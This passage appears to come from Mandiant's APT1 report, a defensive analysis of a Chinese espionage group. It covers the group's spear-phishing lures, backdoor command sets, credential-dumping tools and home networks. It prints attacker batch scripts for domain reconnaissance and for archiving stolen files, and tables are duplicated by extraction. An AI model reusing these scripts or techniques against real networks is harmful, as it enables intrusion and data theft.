2013](http://krebsonsecurity.com/2012/09/chinese-hackers-blamed-for-intrusion-at-energy-industry-giant-telvent/)\n\n32 Reid Wightman, “Spear Phishing Attempt,” Digital Bond (2012), https://www.digitalbond.com/blog/2012/06/07/spear-phishing-attempt/, accessed\nFebruary 3, 2013.\n\n33 Jaime Blasco, “Unveiling a spearphishing campaign and possible ramifications,” Alien Vault (2012), http://labs.alienvault.com/labs/index.\nphp/2012/unveiling-a-spearphishing-campaign-and-possible-ramifications/, accessed February 3, 2013.\n\n34 Chloe Whiteaker, “Following the Hackers’ Trail,” Bloomberg, (2012) http://go.bloomberg.com/multimedia/following-hackers-trail/, accessed\nFebruary 3, 2013.\n\n\n-----\n\n##### APT1: Attack Lifecycle\n\nAPT1 has a well-defined attack methodology, honed over years and designed to steal massive quantities of intellectual\nproperty. They begin with aggressive spear phishing, proceed to deploy custom digital weapons, and end by exporting\ncompressed bundles of files to China – before beginning the cycle again. They employ good English — with acceptable\nslang — in their socially engineered emails. They have evolved their digital weapons for more than seven years,\nresulting in continual upgrades as part of their own software release cycle. Their ability to adapt to their environment\nand spread across systems makes them effective in enterprise environments with trust relationships.\n\nThese attacks fit into a cyclic pattern of activity that we will describe in this section within the framework of Mandiant’s\nAttack Lifecycle model. In each stage we will discuss APT1’s specific techniques to illustrate their tenacity and the\nscale at which they operate. (See Appendix B: “APT and the Attack Lifecycle” for a high-level overview of the steps\nmost APT groups take in each stage of the Attack Lifecycle.)\n\n**Move**\n**Laterally**\n**Maintain**\n**Presence**\n\n**Internal**\n\n**Initial** **Initial** **Establish** **Escalate** **Recon** **Complete**\n**Recon** **Compromise** **Foothold** **Privileges** **Mission**\n\n**Figure 14: Mandiant’s Attack Lifecycle Model**\n\n\n-----\n\n###### The Initial Compromise\n\nThe Initial Compromise represents the methods intruders use to first penetrate a target organization’s network. As with\nmost other APT groups, spear phishing is APT1’s most commonly used technique. The spear phishing emails contain\neither a malicious attachment or a hyperlink to a malicious file. The subject line and the text in the email body are\nusually relevant to the recipient. APT1 also creates webmail accounts using real peoples’ names — names that are\nfamiliar to the recipient, such as a colleague, a company executive, an IT department employee, or company counsel\n— and uses these accounts to send the emails. As a real-world example, this is an email that APT1 sent to Mandiant\nemployees:\n```\n               Date: Wed, 18 Apr 2012 06:31:41 -0700\n               From: Kevin Mandia <kevin.mandia@rocketmail.com>\n               Subject: Internal Discussion on the Press\n               Release\n               Hello,\n               Shall we schedule a time to meet next week?\n\n```\nWe need to finalize the press release.\n```\n               Details click here.\n               Kevin Mandia\n\n```\n**Figure 15: APT1 Spear Phishing Email**\n\nAt first glance, the email appeared to be from Mandiant’s CEO, Kevin Mandia. However, further scrutiny shows that\nthe email was not sent from a Mandiant email account, but from “kevin.mandia@rocketmail.com”. Rocketmail is a\nfree webmail service. The account “kevin.mandia@rocketmail.com” does not belong to Mr. Mandia. Rather, an APT1\nactor likely signed up for the account specifically for this spear phishing event. If anyone had clicked on the link that\nday (which no one did, thankfully), their computer would have downloaded a malicious ZIP file named “Internal_\nDiscussion_Press_Release_In_Next_Week8.zip”. This file contained a malicious executable that installs a custom APT1\nbackdoor that we call WEBC2-TABLE.\n\n\n-----\n\nAlthough the files that APT1 actors attach or link to spear phishing emails are not always in ZIP format, this is the\npredominant trend we have observed in the last several years. Below is a sampling of file names that APT1 has used\nwith their malicious ZIP files:\n\n2012ChinaUSAviationSymposium.zip\nEmployee-Benefit-and-Overhead-Adjustment-Keys.zip\nMARKET-COMMENT-Europe-Ends-Sharply-Lower-On-Data-Yields-Jump.zip\nNegative_Reports_Of_Turkey.zip\nNew_Technology_For_FPGA_And_Its_Developing_Trend.zip\nNorth_Korean_launch.zip\nOil-Field-Services-Analysis-And-Outlook.zip\nPOWER_GEN_2012.zip\nProactive_Investors_One2One_Energy_Investor_Forum.zip\nSocial-Security-Reform.zip\nSouth_China_Sea_Security_Assessment_Report.zip\nTelephonics_Supplier_Manual_v3.zip\nThe_Latest_Syria_Security_Assessment_Report.zip\nUpdated_Office_Contact_v1.zip\nUpdated_Office_Contact_v2.zip\nWelfare_Reform_and_Benefits_Development_Plan.zip\n\n**What’s this** The example file names include military,\n**email?**\n\neconomic, and diplomatic themes,\nsuggesting the wide range of industries that\nAPT1 targets. Some names are also generic\n\n**@**\n\n(e.g., “updated_office_contact_v1.zip”) and\n\n**Spear Phishing Email**\n\ncould be used for targets in any industry.\n\n###### APT 1 with Attachment\n\nOn some occasions, unsuspecting email\nrecipients have replied to the spear\n\n**Is this for real?**\n\nphishing messages, believing they were\ncommunicating with their acquaintances.\nIn one case a person replied, “I’m not sure\n\n**@** if this is legit, so I didn’t open it.” Within 20\n\nminutes, someone in APT1 responded with\n\n###### APT 1 a terse email back: “It’s legit.”\n\n**Okay, thanks!**\n\n**“It’s legit.”**\n**@[!]**\n\n###### APT 1\n\n**Figure 16: APT1’s interaction with a spear phishing recipient**\n\n\n-----\n\n**Would you click on this?**\n\nSome APT1 actors have gone to the trouble of making the malicious software inside their ZIP files look\nlike benign Adobe PDF files. Here is an example:\n\nThis is not a PDF file. It looks like the filename has a PDF extension but the file name actually includes\n119 spaces after “.pdf” followed by “.exe” — the real file extension. APT1 even went to the trouble of\nturning the executable’s icon to an Adobe symbol to complete the ruse. However, this file is actually a\ndropper for a custom APT1 backdoor that we call WEBC2-QBP.\n\n###### Establishing A Foothold\n\nEstablishing a foothold involves actions that ensure control of the target network’s systems from outside the network.\nAPT1 establishes a foothold once email recipients open a malicious file and a backdoor is subsequently installed. A\nbackdoor is software that allows an intruder to send commands to the system remotely. In almost every case, APT\nbackdoors initiate outbound connections to the intruder’s “command and control” (C2) server. APT intruders employ\nthis tactic because while network firewalls are generally adept at keeping malware outside the network from initiating\ncommunication with systems inside the network, they are less reliable at keeping malware that is already inside the\nnetwork from communicating to systems outside.\n\n## C2\n###### 111001100100011010100           100101001010001100100011010100          \n\n**Figure 17: Backdoors installed on compromised systems usually initiate connections with C2 servers**\n\nWhile APT1 intruders occasionally use publicly available backdoors such as Poison Ivy and Gh0st RAT, the vast\nmajority of the time they use what appear to be their own custom backdoors. We have documented 42 families of\nbackdoors in “Appendix C: The Malware Arsenal” that APT1 uses that we believe are not publicly available. In addition\nwe have provided 1,007 MD5 hashes associated with APT1 malware in Appendix E. We will describe APT1’s backdoors\nin two categories: “Beachhead Backdoors” and “Standard Backdoors.”\n\n\n-----\n\n###### Beachhead Backdoors\n\n What is a malware family?\n\nBeachhead backdoors are typically minimally\nfeatured. They offer the attacker a toe-hold to A malware family is a collection of malware in which each\nperform simple tasks like retrieve files, gather sample shares a significant amount of code with all of\nbasic system information and trigger the the others. To help illustrate this, consider the following\nexecution of other more significant capabilities example from the physical world. There is now a vast array\nsuch as a standard backdoor. of computing tablets for sale. These include Apple’s iPad,\n\nSamsung’s Galaxy Tab, and Microsoft’s Surface. Although\n\nAPT1’s beachhead backdoors are usually these are all tablet computers, “under the hood” they are\nwhat we call WEBC2 backdoors. WEBC2 probably quite different. However, one can expect that\nbackdoors are probably the most well-known an iPad 1 and an iPad 2 share a significant number of\nkind of APT1 backdoor, and are the reason components — much more than, say, an iPad 1 and a\nwhy some security companies refer to APT1 Microsoft Surface. Thus it makes sense to refer to the iPad\nas the “Comment Crew.” A WEBC2 backdoor “family” and the Surface “family”.\nis designed to retrieve a webpage from a C2\nserver. It expects the webpage to contain When it comes to computer programs, in general if they\nspecial HTML tags; the backdoor will attempt share more than 80% of the same code we consider them\nto interpret the data between the tags as part of the same family. There are exceptions: for example,\ncommands. Older versions of WEBC2 read some files contain public and standard code libraries that\ndata between HTML comments, though over we do not take into consideration when making a family\ntime WEBC2 variants have evolved to read determination.\ndata contained within other types of tags.\nFrom direct observation, we can confirm\nthat APT1 was using WEBC2 backdoors as\nearly as July 2006. However, the first compile time[35] we have for WEBC2-KT3 is 2004-01-23, suggesting that APT1\nhas been crafting WEBC2 backdoors since early 2004. Based on the 400+ samples of WEBC2 variants that we have\naccumulated, it appears that APT1 has direct access to developers who have continually released new WEBC2 variants\nfor over six years.\n\nFor example, these two build paths, which were discovered inside WEBC2-TABLE samples, help to illustrate how APT1\nhas been steadily building new WEBC2 variants as part of a continuous development process:\n\n**Sample A**\nMD5: d7aa32b7465f55c368230bb52d52d885 **WEBC2 families**\n```\n     Compile date: 2012-02-23\n\n```\n\\work\\code\\2008-7-8muma\\mywork\\winInet_ WEBC2-AUSOV WEBC2-KT3\n`winApplication2009-8-7\\mywork\\` WEBC2-ADSPACE WEBC2-QBP\n`aaaaaaa2012-2-23\\Release\\aaaaaaa.pdb` WEBC2-BOLID WEBC2-RAVE\n\nWEBC2-CLOVER WEBC2-TABLE\n\n**Sample B**\n\nWEBC2-CSON WEBC2-TOCK\n```\n     MD5: c1393e77773a48b1eea117a302138554\n\n```\n`Compile date: 2009-08-07` WEBC2-DIV WEBC2-UGX\nD:\\work\\code\\2008-7-8muma\\mywork\\winInet_ WEBC2-GREENCAT WEBC2-YAHOO\n`winApplication2009-8-7\\mywork\\aaaaaaa\\Release\\` WEBC2-HEAD WEBC2-Y21K\n```\n     aaaaaaa.pdb\n\n```\n… and many still uncategorized\n\n35 “Compile” refers to the process of transforming a programmer’s source code into a file that a computer can understand and execute. The compile\ndate is easily accessible in the PE header of the resulting executable file unless the intruder takes additional steps to obfuscate it.\n\n\n-----\n\nA “build path” discloses the directory from which the programmer\nbuilt and compiled his source code. These samples, compiled 2.5 **APT 1 MALWARE FAMILIES**\nyears apart, were compiled within a folder named “work\\code\\...\\ FIRST KNOWN COMPILE TIMES\nmywork”. The instances of “work” suggest that working on WEBC2 is\n\n2004 WEBC2.KT3\n\nsomeone’s day job and not a side project or hobby. Furthermore, the\nSample A build string includes “2012-2-23” — which matches Sample\nA’s compile date. The Sample B build string lacks “2012-2-23” but\nincludes “2009-8-7” — which also matches Sample B’s compile date.\nThis suggests that the code used to compile Sample A was modified\nfrom code that was used to compile Sample B 2.5 years previously. The 2005 GETMAIL\nexistence of “2008-7-8” suggests that the code for both samples was\nmodified from a version that existed in July 2008, a year before Sample\nB was created. This series of dates indicates that developing and\nmodifying the WEBC2 backdoor is an iterative and long-term process.\n\n2006\n\nWEBC2 backdoors typically give APT1 attackers a short and\nrudimentary set of commands to issue to victim systems, including:\n»» Open an interactive command shell (usually Windows’ cmd.exe) LIGHTDART\n»» Download and execute a file MAPIGET\n»» Sleep (i.e. remain inactive) for a specified amount of time\n\n2007\n\nWEBC2 backdoors are often packaged with spear phishing emails.\n\nBISCUIT\n\nOnce installed, APT1 intruders have the option to tell victim systems WEBC2.Y21K\n\nMANITSME\n\nto download and execute additional malicious software of their choice. WEBC2.UGX\n\nSTARSYPOUND\n\nWEBC2 backdoors work for their intended purpose, but they generally TARSIP\n\n2008 DAIRY\n\nhave fewer features than the “Standard Backdoors” described below.\n\nSWORD\nHELAUTO\n\n###### Standard Backdoors\n\nThe standard, non-WEBC2 APT1 backdoor typically communicates WEBC2.AUSOV\n\nHACKSFASE\n\nusing the HTTP protocol (to blend in with legitimate web traffic) or a AURIGA\ncustom protocol that the malware authors designed themselves. These 2009 GREENCAT WEBC2.CLOVER\n\nMACROMAIL\n\nbackdoors give APT intruders a laundry list of ways to control victim GOGGLES\nsystems, including: WEBC2.RAVE NEWSREELS\n\nWEBC2.ADSPACE\n\n»» Create/modify/delete/execute programs\n\nWEBC2.HEAD\n\n»» Upload/download files BANGAT\n»» Create/delete directories 2010\n»» List/start/stop processes SEASALT\n\nLONGRUN WEBC2.TOCK\n\n»» Modify the system registry\n»» Take screenshots of the user’s desktop WEBC2.YAHOO\n\nWARP\n\n»» Capture keystrokes WEBC2.QBP TABMSGSQL\n\nWEBC2.CSON\n\n»» Capture mouse movement\n»» Start an interactive command shell 2011 LIGHTBOLTWEBC2.DIV COMBOS\n»» Create a Remote desktop (i.e. graphical) interface COOKIEBAG\n\nGDOCUPLOAD\n\n»» Harvest passwords\n\nGLOOXMAIL\n\n»» Enumerate users MINIASP\n»» Enumerate other systems on the network BOUNCER\n\n2012\n\n»» Sleep (i.e. go inactive) for a specified amount of time CALENDAR\n\nWEBC2.TABLE\n\n»» Log off the current user WEBC2.BOLID\n\nKURTON\n\n»» Shut down the system\n\n\n-----\n\n|Command|Description|\n|---|---|\n|bdkzt|Launch a command shell|\n|ckzjqk|Get system information|\n|download <file>|Transfer a file from the C2 server|\n|exe <file> <user>|Launch a program as a specific user|\n|exit|Close the connection and sleep|\n|lists <type>|List servers on a Windows network.|\n|ljc|Enumerate running processes and identify their owners.|\n|sjc <PID>|<NAME>|Terminate a process, either by process ID or by process name.|\n|upload <file>|Send a file to the C2 server|\n|zxdosml <input>|Send input to the command shell process (launched with “bdkzt”).|\n\n|Backdoor|Mimicked protocol|\n|---|---|\n|MACROMAIL|MSN Messenger|\n|GLOOXMAIL|Jabber/XMPP|\n|CALENDAR|Gmail Calendar|\n\n\nThe BISCUIT backdoor (so named for the command “bdkzt”) is an illustrative example of the range of commands that\nAPT1 has built into its “standard” backdoors. APT1 has used and steadily modified BISCUIT since as early as 2007\nand continues to use it presently.\n\n**Table 4: A subset of BISCUIT commands**\n\n**Command** **Description**\n\nbdkzt Launch a command shell\n\nckzjqk Get system information\n\n`download <file>` Transfer a file from the C2 server\n\n`exe <file> <user>` Launch a program as a specific user\n\n`exit` Close the connection and sleep\n\n`lists <type>` List servers on a Windows network.\n\n`ljc` Enumerate running processes and identify their owners.\n\n`sjc <PID>|<NAME>` Terminate a process, either by process ID or by process name.\n\n`upload <file>` Send a file to the C2 server\n\nzxdosml <input> Send input to the command shell process (launched with “bdkzt”).\n\nThese functions are characteristic of most backdoors, and are not limited to APT1 or even APT. For example, anyone\nwho wants to control a system remotely will likely put functions like “Upload/download files” into a backdoor.\n\n###### Covert Communications\n\nSome APT backdoors attempt to mimic legitimate Internet traffic other than the HTTP protocol. APT1 has created a\nhandful of these, including:\n\n**Table 5: Backdoors that mimic legitimate communication protocols**\n\n**Backdoor** **Mimicked protocol**\n\n**MACROMAIL** MSN Messenger\n\n**GLOOXMAIL** Jabber/XMPP\n\n**CALENDAR** Gmail Calendar\n\nWhen network defenders see the communications between these backdoors and their C2 servers, they might easily\ndismiss them as legitimate network traffic. Additionally, many of APT1’s backdoors use SSL encryption so that\ncommunications are hidden in an encrypted SSL tunnel. We have provided APT1’s public SSL certificates in Appendix\nF so people can incorporate them into their network signatures.\n\n\n-----\n\n|Tool|Description|Website|\n|---|---|---|\n|cachedump|This program extracts cached password hashes from a system’s registry|Currently packaged with fgdump (below)|\n|fgdump|Windows password hash dumper|http://www.foofus.net/fizzgig/fgdump/|\n|gsecdump|Obtains password hashes from the Windows registry, including the SAM file, cached domain credentials, and LSA secrets|http://www.truesec.se|\n|lslsass|Dump active logon session password hashes from the lsass process|http://www.truesec.se|\n|mimikatz|A utility primarily used for dumping password hashes|http://blog.gentilkiwi.com/mimikatz|\n|pass-the-hash toolkit|Allows an intruder to “pass” a password hash (without knowing the original password) to log in to systems|http://oss.coresecurity.com/projects/pshtoolkit.htm|\n|pwdump7|Dumps password hashes from the Windows registry|http://www.tarasco.org/security/pwdump_7/|\n|pwdumpX|Dumps password hashes from the Windows registry|The tool claims its origin as http://reedarvin.thearvins.com/, but the site is not offering this software as of the date of this report|\n\n\n###### Privilege Escalation\n\nEscalating privileges involves acquiring items (most often usernames and passwords) that will allow access to more\nresources within the network. In this and the next two stages, APT1 does not differ significantly from other APT\nintruders (or intruders, generally). APT1 predominantly uses publicly available tools to dump password hashes from\nvictim systems in order to obtain legitimate user credentials.\n\nAPT1 has used these privilege escalation tools:\n\n**Table 6: Publicly available privilege escalation tools that APT1 has used**\n\n**Tool** **Description** **Website**\n\n**cachedump** This program extracts cached Currently packaged with fgdump (below)\npassword hashes from a system’s\nregistry\n\n**fgdump** Windows password hash dumper http://www.foofus.net/fizzgig/fgdump/\n\n**gsecdump** Obtains password hashes from the http://www.truesec.se\nWindows registry, including the SAM\nfile, cached domain credentials, and\nLSA secrets\n\n**lslsass** Dump active logon session password http://www.truesec.se\nhashes from the lsass process\n\n**mimikatz** A utility primarily used for dumping http://blog.gentilkiwi.com/mimikatz\npassword hashes\n\n**pass-the-hash** Allows an intruder to “pass” a http://oss.coresecurity.com/projects/pshtoolkit.htm\n**toolkit** password hash (without knowing the\noriginal password) to log in to systems\n\n**pwdump7** Dumps password hashes from the http://www.tarasco.org/security/pwdump_7/\nWindows registry\n\n**pwdumpX** Dumps password hashes from the The tool claims its origin as http://reedarvin.thearvins.com/,\nWindows registry but the site is not offering this software as of the date of this\nreport\n\n\n-----\n\n###### What is a password hash?\n\nWhen a person logs in to a computer, website, email server, or any networked resource requiring a password,\nthe supplied password needs to be verified. One way to do this would be to store the person’s actual password\non the system that the person is trying to access, and to compare the typed password to the stored password.\nAlthough simple, this method is also very insecure: anyone who can access that same system will be able to\nsee the person’s password. Instead, systems that verify passwords usually store password hashes. In simple\nterms, a password hash is a number that is mathematically generated from the person’s password. The\nmathematical methods (algorithms) used to generate password hashes will create values that are unique for\nall practical purposes. When a person supplies their password, the computer generates a hash of the typed\npassword and compares it to the stored hash. If they match, the passwords are presumed to be the same and\nthe person is allowed to log in.\n\nIt is supposed to be impossible to “reverse” a hash to obtain the original password. However, it is possible with\nenough computational resources to “crack” password hashes to discover the original password. (“Cracking”\ngenerally consists of guessing a large number of passwords, hashing them, and comparing the generated\nhashes to the existing hashes to see if any match.) Intruders will steal password hashes from victim systems\nin hopes that they can either use the hashes as-is (by “passing-the-hash”) or crack them to discover users’\npasswords.\n\n###### Internal Reconnaissance\n\nIn the Internal Reconnaissance stage, the intruder collects information about the victim environment. Like most APT\n(and non-APT) intruders, APT1 primarily uses built-in operating system commands to explore a compromised system\nand its networked environment. Although they usually simply type these commands into a command shell, sometimes\nintruders may use batch scripts to speed up the process. Figure 18 below shows the contents of a batch script that\nAPT1 used on at least four victim networks.\n\n@echo off\nipconfig /all>>”C:\\WINNT\\Debug\\1.txt”\nnet start>>”C:\\WINNT\\Debug\\1.txt”\ntasklist /v>>”C:\\WINNT\\Debug\\1.txt”\nnet user >>”C:\\WINNT\\Debug\\1.txt”\nnet localgroup administrators>>”C:\\WINNT\\Debug\\1.txt”\nnetstat -ano>>”C:\\WINNT\\Debug\\1.txt”\nnet use>>”C:\\WINNT\\Debug\\1.txt”\nnet view>>”C:\\WINNT\\Debug\\1.txt”\nnet view /domain>>”C:\\WINNT\\Debug\\1.txt”\nnet group /domain>>”C:\\WINNT\\Debug\\1.txt”\nnet group “domain users” /domain>>”C:\\WINNT\\Debug\\1.txt”\nnet group “domain admins” /domain>>”C:\\WINNT\\Debug\\1.txt”\nnet group “domain controllers” /domain>>”C:\\WINNT\\Debug\\1.txt”\nnet group “exchange domain servers” /domain>>”C:\\WINNT\\Debug\\1.txt”\nnet group “exchange servers” /domain>>”C:\\WINNT\\Debug\\1.txt”\nnet group “domain computers” /domain>>”C:\\WINNT\\Debug\\1.txt”\n\n**Figure 18: An APT1 batch script that automates reconnaissance**\n\n\n-----\n\nThis script performs the following functions and saves the results to a text file:\n\n»» Display the victim’s network configuration information\n\n»» List the services that have started on the victim system\n\n»» List currently running processes\n\n»» List accounts on the system\n\n»» List accounts with administrator privileges\n\n»» List current network connections\n\n»» List currently connected network shares\n\n»» List other systems on the network\n\n»» List network computers and accounts according to group (“domain controllers,” “domain users,” “domain\nadmins,” etc.)\n\n###### Lateral Movement\n\nOnce an APT intruder has a foothold inside the network and a set of legitimate credentials,[36] it is simple for the intruder\nto move around the network undetected:\n\n»» They can connect to shared resources on other systems\n\n»» They can execute commands on other systems using the publicly available “psexec” tool from Microsoft\nSysinternals or the built-in Windows Task Scheduler (“at.exe”)\n\nThese actions are hard to detect because legitimate system administrators also use these techniques to perform\nactions around the network.\n\n###### Maintain Presence\n\nIn this stage, the intruder takes actions to ensure continued, long-term control over key systems in the network\nenvironment from outside of the network. APT1 does this in three ways.\n\n###### 1. Install new backdoors on multiple systems\n\nThroughout their stay in the network (which could be years), APT1 usually installs new backdoors as they claim more\nsystems in the environment. Then, if one backdoor is discovered and deleted, they still have other backdoors they can\nuse. We usually detect multiple families of APT1 backdoors scattered around a victim network when APT1 has been\npresent for more than a few weeks.\n\n###### 2. Use legitimate VPN credentials\n\nAPT actors and hackers in general are always looking for valid credentials in order to impersonate a legitimate user.\nWe have observed APT1 using stolen usernames and passwords to log into victim networks’ VPNs when the VPNs are\nonly protected by single-factor authentication. From there they are able to access whatever the impersonated users are\nallowed to access within the network.\n\n36 Mandiant uses the term “credentials” to refer to a userid and its corresponding, working password.\n\n\n-----\n\n|Col1|.rar|\n|---|---|\n|||\n\n\n###### 3. Log in to web portals\n\nOnce armed with stolen credentials, APT1 intruders also attempt to log into web portals that the network offers. This\nincludes not only restricted websites, but also web-based email systems such as Outlook Web Access.\n\n###### Completing The Mission\n\nSimilar to other APT groups we track, once APT1 finds files of interest they pack them into archive files before stealing\nthem. APT intruders most commonly use the RAR archiving utility for this task and ensure that the archives are\npassword protected. Sometimes APT1 intruders use batch scripts to assist them in the process, as depicted in Figure\n19. (The instances of “XXXXXXXX” obfuscate the text that was in the actual batch script.)\n\n@echo off\ncd /d c:\\windows\\tasks\nrar.log a XXXXXXXX.rar -v200m “C:\\Documents and Settings\\Place\\My\nDocuments\\XXXXXXXX” -hpsmy123!@#\n```\n          del *.vbs\n          del %0\n\n```\n**Figure 19: An APT1 batch script that bundles stolen files into RAR archive files**\n\nAfter creating files compressed via RAR, the APT1 attackers will transfer files out of the network in ways that are\nconsistent with other APT groups, including using the File Transfer Protocol (FTP) or their existing backdoors. Many\ntimes their RAR files are so large that the attacker splits them into chunks before transferring them. Figure 19 above\nshows a RAR command with the option “-v200m”, which means that the RAR file should be split up into 200MB\nportions.\n\n###### .rar\n\n**Figure 20: APT1 bundles stolen files into RAR archives before moving data to China**\n\n\n-----\n\n|Phrase|Tool|Compile date|\n|---|---|---|\n|If use it, key is the KEY.|GETMAIL|2005-08-18|\n|Wether encrypt or not,Default is NOT.|GETMAIL|2005-08-18|\n|ToolHelp API isn’t support on NT versions prior to Windows 2000!|LIGHTDART|2006-08-03|\n|No Doubt to Hack You, Writed by UglyGorilla|MANITSME|2007-09-06|\n|Type command disable.Go on!|HELAUTO|2008-06-16|\n|File no exist.|Simple Downloader (not profiled)|2008-11-26|\n|you specify service name not in Svchost\\netsvcs, must be one of following|BISCUIT|2009-06-02|\n|Can not found the PID|WEBC2 (Uncat)|2009-08-11|\n|Doesn’t started!|GREENCAT|2009-08-18|\n|Exception Catched|MACROMAIL|2010-03-15|\n|Are you sure to FORMAT Disk C With NTFS?(Y/N)|TABMSGSQL|2010-11-04|\n|Shell is not exist or stopped!|TARSIP|2011-03-24|\n|Reqfile not exist!|COOKIEBAG|2011-10-12|\n|the url no respon!|COOKIEBAG|2011-10-12|\n|Fail To Execute The Command|WEBC2-TABLE|2012-02-23|\n\n\nUnlike most other APT groups we track, APT1 uses two email-stealing utilities that we believe are unique to APT1. The\nfirst, GETMAIL, was designed specifically to extract email messages, attachments, and folders from within Microsoft\nOutlook archive (“PST”) files.\n\nMicrosoft Outlook archives can be large, often storing years’ worth of emails. They may be too large to transfer out\nof a network quickly, and the intruder may not be concerned about stealing every email. The GETMAIL utility allows\nAPT1 intruders the flexibility to take only the emails between dates of their choice. In one case, we observed an APT1\nintruder return to a compromised system once a week for four weeks in a row to steal only the past week’s emails.\n\nWhereas GETMAIL steals email in Outlook archive files, the second utility, MAPIGET, was designed specifically to steal\nemail that has not yet been archived and still resides on a Microsoft Exchange Server. In order to operate successfully,\nMAPIGET requires username/password combinations that the Exchange server will accept. MAPIGET extracts email\nfrom specified accounts into text files (for the email body) and separate attachments, if there are any.\n\n###### English As A Second Language\n\nAPT1’s “It’s legit” email should not mislead someone into thinking that APT1 personnel are all fluent in English, though\nsome undoubtedly are. Their own digital weapons betray the fact that they were programmed by people whose first\nlanguage is not English. Here are some examples of grammatically incorrect phrases that have made it into APT1’s\ntools over the years.\n\n**Table 7: Examples of grammatically incorrect phrases in APT1 malware**\n\n**Phrase** **Tool** **Compile date**\n\nIf use it, key is the KEY.

We have evidence suggesting that APT1\nmanually controls thousands of systems in support of their attacks, and have directly observed their control over\nhundreds of these systems. Although they control systems in dozens of countries, their attacks originate from four large\nnetworks in Shanghai — two of which are allocated directly to the Pudong New Area, the home of Unit 61398. The\nsheer number of APT1 IP addresses concentrated in these Shanghai ranges, coupled with Simplified Chinese keyboard\nlayout settings on APT1’s attack systems, betrays the true location and language of the operators. To help manage the\nvast number of systems they control, APT1 has registered hundreds of domain names, the majority of which also point\nto a Shanghai locale. The domain names and IP addresses together comprise APT1’s command and control framework\nwhich they manage in concert to camouflage their true origin from their English speaking targets.\n\n###### APT1 Network Origins\n\nWe are frequently asked why it is an ineffective security measure to just block all IP addresses in China from\nconnecting to your network. To put it simply, it is easy for APT1 attackers to bounce or “hop” through intermediary\nsystems such that they almost never connect to a victim network directly from their systems in Shanghai. Using their\nimmense infrastructure, they are able to make it appear to victims that an attack originates from almost any country\nthey choose. The systems in this type of network redirection infrastructure have come to be called “hop points”\nor “hops.” Hop points are most frequently compromised systems that APT1 uses, in some instances for years, as\ncamouflage for their attacks without the knowledge of the systems’ owners. These systems belong to third-party victims\nwho are compromised for access to infrastructure, as opposed to direct victims who are compromised for their data\nand intellectual property.\n\n**Figure 21: APT1 bounces through “hop point” systems before accessing victim systems**\n\n\n-----\n\n|Number|Net block|Registered Owner|\n|---|---|---|\n|445|223.166.0.0 - 223.167.255.255|China Unicom Shanghai Network|\n|217|58.246.0.0 - 58.247.255.255|China Unicom Shanghai Network|\n|114|112.64.0.0 - 112.65.255.255|China Unicom Shanghai Network|\n|12|139.226.0.0 - 139.227.255.255|China Unicom Shanghai Network|\n|1|114.80.0.0 - 114.95.255.255|China Telecom Shanghai Network|\n|1|101.80.0.0 - 101.95.255.255|China Telecom Shanghai Network|\n|27|Other (non-Shanghai) Chinese IPs||\n\n\nWe have observed some of APT1’s activities after they cross into (virtual) U.S. territory. They access hop points using\na variety of techniques, the most popular being Remote Desktop and FTP. Over a two-year period (January 2011 to\nJanuary 2013) we confirmed 1,905 instances of APT1 actors logging into their hop infrastructure from 832 different\nIP addresses with Remote Desktop. Remote Desktop provides a remote user with an interactive graphical interface to\na system. The experience is similar to the user actually physically sitting at the system and having direct access to the\ndesktop, keyboard, and mouse. Of the 832 IP addresses, 817 (98.2%) were Chinese and belong predominantly to four\nlarge net blocks in Shanghai which we will refer to as APT1’s home networks.\n\n**Table 8: Net blocks corresponding to IP addresses that APT1 used to access their hop points**\n\n**Number** **Net block** **Registered Owner**\n\n**445** 223.166.0.0 - 223.167.255.255 China Unicom Shanghai Network\n\n**217** 58.246.0.0 - 58.247.255.255 China Unicom Shanghai Network\n\n**114** 112.64.0.0 - 112.65.255.255 China Unicom Shanghai Network\n\n**12** 139.226.0.0 - 139.227.255.255 China Unicom Shanghai Network\n\n**1** 114.80.0.0 - 114.95.255.255 China Telecom Shanghai Network\n\n**1** 101.80.0.0 - 101.95.255.255 China Telecom Shanghai Network\n\n**27** Other (non-Shanghai) Chinese IPs\n\nNotably, the registration information for the second and third net blocks above includes this contact information at the\nend:\n\nperson: yanling ruan\nnic-hdl: YR194-AP\n```\n        e-mail:  sh-ipmaster@chinaunicom.cn\n\n```\naddress: No.900,Pudong Avenue,ShangHai,China\n```\n        phone:  +086-021-61201616\n\n```\nfax-no: +086-021-61201616\n```\n        country:  cn\n\n```\nThe registration information for these two net blocks suggests that they serve the Pudong New Area of Shanghai, where\nPLA Unit 61398 is headquartered.\n\nThe other 15 of the 832 IP addresses are registered to organizations in the U.S. (12), Taiwan (1), Japan (1) and Korea\n(1). We have confirmed that some of these systems are part of APT1’s hop infrastructure and not legitimately owned\nby APT1 — in other words, APT1 accessed one hop from another hop, as opposed to accessing the hop directly from\nShanghai.\n\nIn order to make a user’s experience as seamless as possible, the Remote Desktop protocol requires client applications\nto forward several important details to the server, including their client hostname and the client keyboard layout.\nIn 1,849 of the 1,905 (97%) APT1 Remote Desktop sessions we observed in the past two years, the keyboard\nlayout setting was “Chinese (Simplified) — US Keyboard.” Microsoft’s Remote Desktop client configures this setting\nautomatically based on the selected language on the client system, making it nearly certain that the APT1 actors\nmanaging the hop infrastructure are doing so with Simplified Chinese (zh-cn) input settings. “Simplified Chinese” is\na streamlined set of the traditional Chinese characters that have been in use since the 1950s, originating in mainland\nChina. Taiwan and municipalities such as Hong Kong still use “Traditional Chinese” (zh-tw) character sets.\n\nThe overwhelming concentration of Shanghai IP addresses and Simplified Chinese language settings clearly indicate\nthat APT1 intruders are mainland Chinese speakers with ready access to large networks in Shanghai. The only\n\n\n-----\n\nalternative is that APT1 has intentionally been conducting a years-long deception campaign to impersonate Chinese\nspeakers from Shanghai in places where victims are not reasonably expected to have any visibility – and without\nmaking a single mistake that might indicate their “true” identity.\n\n###### Interaction with Backdoors\n\nAs we just mentioned, APT1 attackers typically use hops to connect to and control victim systems. Victim backdoors\nregularly connect out to hop points, waiting for the moment that the attacker is there to give them commands. However,\nexactly how this works is often specific to the tools they are using.\n\n###### Manual WEBC2 updates\n\nAs covered in the previous “Attack Lifecycle” section, WEBC2 backdoor variants download and interpret data stored\nbetween tags in HTML pages as commands. They usually download HTML pages from a system within APT1’s hop\ninfrastructure. We have observed APT1 intruders logging in to WEBC2 servers and manually editing the HTML pages\nthat backdoors will download. Because the commands are usually encoded and difficult to spell from memory, APT1\nintruders typically do not type these strings, but instead copy and paste them into the HTML files. They likely generate\nthe encoded commands on their own systems before pasting them in to an HTML file hosted by the hop point. For\nexample, we observed an APT attacker pasting the string “czo1NA==” into an HTML page. That string is the base64-\nencoded version of “s:54”, meaning “sleep for 54 